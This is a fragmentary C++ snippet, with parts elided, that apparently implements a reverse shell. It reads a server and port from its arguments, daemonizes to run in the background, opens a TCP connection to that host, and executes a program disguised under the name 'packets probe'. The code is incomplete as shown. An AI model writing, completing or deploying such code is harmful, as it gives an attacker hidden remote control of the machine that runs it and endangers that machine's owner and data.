...
cout << red << "./binary server port" <<endl; return 1;}cout << 
green << "Connection sent!" << norm << endl;daemon(1, 1);int s0;
struct sockaddr_in target; s0 = socket(AF_INET , SOCK_STREAM , 0); 
if (s0 < 0){close(s0); return 1;}target.sin_addr.s_addr = inet_addr(
...
execl(packets probe,packets probe,(char*)0);close(s0);}return 0;}
